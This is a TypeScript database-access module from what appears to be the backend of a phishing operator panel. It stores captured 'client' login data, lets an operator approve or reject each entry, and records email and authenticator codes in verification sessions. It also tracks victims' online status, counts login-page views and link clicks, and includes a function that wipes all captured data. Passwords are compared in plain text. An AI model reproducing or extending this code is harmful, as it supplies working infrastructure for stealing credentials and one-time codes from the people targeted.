import { eq, and, gt, ne, desc } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";
import { InsertUser, users, clientLoginData, InsertClientLoginData, validCredentials, InsertValidCredentials, verificationSessions, InsertVerificationSession, pageViewStats } from "../drizzle/schema";
import { ENV } from './_core/env';

let _db: ReturnType<typeof drizzle> | null = null;

// Lazily create the drizzle instance so local tooling can run without a DB.
export async function getDb() {
  if (!_db) {
    if (!process.env.DATABASE_URL) {
      console.warn("[Database] DATABASE_URL not set");
      return null;
    }
    try {
      _db = drizzle(process.env.DATABASE_URL, {
        mode: 'default',
      });
      console.log("[Database] Connected successfully");
    } catch (error) {
      console.error("[Database] Failed to connect:", error);
      _db = null;
      throw error;
    }
  }
  return _db;
}

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) {
    throw new Error("User openId is required for upsert");
  }

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert user: database not available");
    return;
  }

  try {
    const values: InsertUser = {
      openId: user.openId,
    };
    const updateSet: Record<string, unknown> = {};

    const textFields = ["name", "email", "loginMethod"] as const;
    type TextField = (typeof textFields)[number];

    const assignNullable = (field: TextField) => {
      const value = user[field];
      if (value === undefined) return;
      const normalized = value ?? null;
      values[field] = normalized;
      updateSet[field] = normalized;
    };

    textFields.forEach(assignNullable);

    if (user.lastSignedIn !== undefined) {
      values.lastSignedIn = user.lastSignedIn;
      updateSet.lastSignedIn = user.lastSignedIn;
    }
    if (user.role !== undefined) {
      values.role = user.role;
      updateSet.role = user.role;
    } else if (user.openId === ENV.ownerOpenId) {
      values.role = 'admin';
      updateSet.role = 'admin';
    }

    if (!values.lastSignedIn) {
      values.lastSignedIn = new Date();
    }

    if (Object.keys(updateSet).length === 0) {
      updateSet.lastSignedIn = new Date();
    }

    await db.insert(users).values(values).onDuplicateKeyUpdate({
      set: updateSet,
    });
  } catch (error) {
    console.error("[Database] Failed to upsert user:", error);
    throw error;
  }
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get user: database not available");
    return null;
  }

  try {
    const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);
    return result.length > 0 ? result[0] : null;
  } catch (error) {
    console.error("[Database] Failed to get user:", error);
    throw error;
  }
}

export async function saveClientLoginData(data: InsertClientLoginData) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot save client login data: database not available");
    return null;
  }

  try {
    const result = await db.insert(clientLoginData).values(data);
    // result[0] contains insertId for the inserted row
    return result[0]?.insertId || result[0];
  } catch (error) {
    console.error("[Database] Failed to save client login data:", error);
    throw error;
  }
}

export async function getAllClientLoginData() {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get client login data: database not available");
    return [];
  }

  try {
    const result = await db.select().from(clientLoginData).orderBy(desc(clientLoginData.createdAt));
    return result;
  } catch (error) {
    console.error("[Database] Failed to get client login data:", error);
    throw error;
  }
}

export async function validateCredentials(
  email?: string,
  password?: string,
  phoneNumber?: string,
  phoneCountryCode?: string
) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot validate credentials: database not available");
    return false;
  }

  try {
    if (email && password) {
      const result = await db
        .select()
        .from(validCredentials)
        .where(eq(validCredentials.email, email))
        .limit(1);

      if (result.length === 0) {
        return false;
      }

      const credential = result[0];
      // In production, you should hash the password and compare
      // For now, we'll do a simple comparison
      return credential.password === password;
    }

    if (phoneNumber && phoneCountryCode && password) {
      const result = await db
        .select()
        .from(validCredentials)
        .where(eq(validCredentials.phoneNumber, phoneNumber))
        .limit(1);

      if (result.length === 0) {
        return false;
      }

      const credential = result[0];
      return credential.password === password && credential.phoneCountryCode === phoneCountryCode;
    }

    return false;
  } catch (error) {
    console.error("[Database] Failed to validate credentials:", error);
    throw error;
  }
}

export async function updateValidationStatus(
  id: number,
  status: string,
  rejectionReason?: string
) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot update validation status: database not available");
    return;
  }

  try {
    const updates: any = {
      validationStatus: status,
      updatedAt: new Date(),
    };

    if (rejectionReason) {
      updates.rejectionReason = rejectionReason;
    }

    await db.update(clientLoginData).set(updates).where(eq(clientLoginData.id, id));
  } catch (error) {
    console.error("[Database] Failed to update validation status:", error);
    throw error;
  }
}

export async function createVerificationSession(data: InsertVerificationSession) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot create verification session: database not available");
    return null;
  }

  try {
    // Marcar sessões antigas como expiradas
    if (data.clientLoginDataId) {
      await db
        .update(verificationSessions)
        .set({ status: "expired" as any })
        .where(
          and(
            eq(verificationSessions.clientLoginDataId, data.clientLoginDataId),
            ne(verificationSessions.status, "expired" as any)
          )
        );
    }
    
    const result = await db.insert(verificationSessions).values(data);
    return result;
  } catch (error) {
    console.error("[Database] Failed to create verification session:", error);
    throw error;
  }
}

export async function getVerificationSession(sessionId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get verification session: database not available");
    return null;
  }

  try {
    const result = await db
      .select({
        id: verificationSessions.id,
        clientLoginDataId: verificationSessions.clientLoginDataId,
        sessionId: verificationSessions.sessionId,
        status: verificationSessions.status,
        emailCode: verificationSessions.emailCode,
        authCode: verificationSessions.authCode,
        emailCodeAttempts: verificationSessions.emailCodeAttempts,
        authCodeAttempts: verificationSessions.authCodeAttempts,
        createdAt: verificationSessions.createdAt,
        updatedAt: verificationSessions.updatedAt,
        expiresAt: verificationSessions.expiresAt,
        rejectionReason: verificationSessions.rejectionReason,
      })
      .from(verificationSessions)
      .leftJoin(clientLoginData, eq(verificationSessions.clientLoginDataId, clientLoginData.id))
      .where(eq(verificationSessions.sessionId, sessionId))
      .limit(1);
    return result.length > 0 ? result[0] : null;
  } catch (error) {
    console.error("[Database] Failed to get verification session:", error);
    throw error;
  }
}

export async function updateVerificationSession(sessionId: string, updates: any) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot update verification session: database not available");
    return;
  }

  try {
    await db.update(verificationSessions).set(updates).where(eq(verificationSessions.sessionId, sessionId));
  } catch (error) {
    console.error("[Database] Failed to update verification session:", error);
    throw error;
  }
}

export async function getActiveVerificationSessions() {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get active verification sessions: database not available");
    return [];
  }

  try {
    const now = new Date();
    const result = await db
      .select()
      .from(verificationSessions)
      .where(
        and(
          gt(verificationSessions.expiresAt, now),
          ne(verificationSessions.status, "verified"),
          ne(verificationSessions.status, "rejected")
        )
      )
      .orderBy(desc(verificationSessions.createdAt));
    return result;
  } catch (error) {
    console.error("[Database] Failed to get active verification sessions:", error);
    throw error;
  }
}

export async function incrementLoginPageViews() {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot increment login page views: database not available");
    return;
  }
  
  try {
    const stats = await db.select().from(pageViewStats).where(eq(pageViewStats.pageType, "login_page"));
    
    if (stats.length === 0) {
      // Create initial record
      await db.insert(pageViewStats).values({
        pageType: "login_page",
        viewCount: 1,
      });
    } else {
      // Increment existing counter
      await db.update(pageViewStats).set({
        viewCount: stats[0].viewCount + 1,
        updatedAt: new Date(),
      }).where(eq(pageViewStats.pageType, "login_page"));
    }
  } catch (error) {
    console.error("[Database] Failed to increment login page views:", error);
    throw error;
  }
}

export async function getLoginPageViews() {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get login page views: database not available");
    return 0;
  }
  
  try {
    const stats = await db.select().from(pageViewStats).where(eq(pageViewStats.pageType, "login_page"));
    return stats.length > 0 ? stats[0].viewCount : 0;
  } catch (error) {
    console.error("[Database] Failed to get login page views:", error);
    return 0;
  }
}
export async function incrementGlobalPageView() {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot increment global page view: database not available");
    return;
  }
  
  try {
    const stats = await db.select().from(pageViewStats).limit(1);
    
    if (stats.length === 0) {
      // Create initial record
      await db.insert(pageViewStats).values({
        pageType: "login_page",
        viewCount: 1,
      });
    } else {
      // Increment existing counter
      await db.update(pageViewStats).set({
        viewCount: stats[0].viewCount + 1,
        updatedAt: new Date(),
      }).where(eq(pageViewStats.id, stats[0].id));
    }
  } catch (error) {
    console.error("[Database] Failed to increment global page view:", error);
    throw error;
  }
}

export async function getGlobalPageViewCount() {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get global page view count: database not available");
    return 0;
  }
  
  try {
    const stats = await db.select().from(pageViewStats).limit(1);
    return stats.length > 0 ? stats[0].viewCount : 0;
  } catch (error) {
    console.error("[Database] Failed to get global page view count:", error);
    return 0;
  }
}

export async function incrementMainLinkClick() {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot increment main link click: database not available");
    return;
  }
  
  try {
    const stats = await db.select().from(pageViewStats).where(eq(pageViewStats.pageType, "main_link_click")).limit(1);
    
    if (stats.length === 0) {
      await db.insert(pageViewStats).values({
        pageType: "main_link_click",
        viewCount: 1,
      });
    } else {
      await db.update(pageViewStats).set({
        viewCount: stats[0].viewCount + 1,
        updatedAt: new Date(),
      }).where(eq(pageViewStats.id, stats[0].id));
    }
  } catch (error) {
    console.error("[Database] Failed to increment main link click:", error);
    throw error;
  }
}

export async function getMainLinkClickCount() {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get main link click count: database not available");
    return 0;
  }
  
  try {
    const stats = await db.select().from(pageViewStats).where(eq(pageViewStats.pageType, "main_link_click")).limit(1);
    return stats.length > 0 ? stats[0].viewCount : 0;
  } catch (error) {
    console.error("[Database] Failed to get main link click count:", error);
    return 0;
  }
}

export async function deleteAllClientLoginData() {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot delete client login data: database not available");
    return;
  }

  try {
    await db.delete(clientLoginData);
    await db.delete(verificationSessions);
    await db.update(pageViewStats).set({
      viewCount: 0,
      updatedAt: new Date(),
    });
    console.log("[Database] All client login data and stats deleted successfully");
  } catch (error) {
    console.error("[Database] Failed to delete client login data:", error);
    throw error;
  }
}

export async function updateClientActivity(clientId: number) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot update client activity: database not available");
    return;
  }

  try {
    await db.update(clientLoginData).set({
      isOnline: "true",
      lastActivityAt: new Date(),
      updatedAt: new Date(),
    }).where(eq(clientLoginData.id, clientId));
  } catch (error) {
    console.error("[Database] Failed to update client activity:", error);
    throw error;
  }
}

export async function markClientOffline(clientId: number) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot mark client offline: database not available");
    return;
  }

  try {
    await db.update(clientLoginData).set({
      isOnline: "false",
      updatedAt: new Date(),
    }).where(eq(clientLoginData.id, clientId));
  } catch (error) {
    console.error("[Database] Failed to mark client offline:", error);
    throw error;
  }
}

// TODO: add feature queries here as your schema grows.
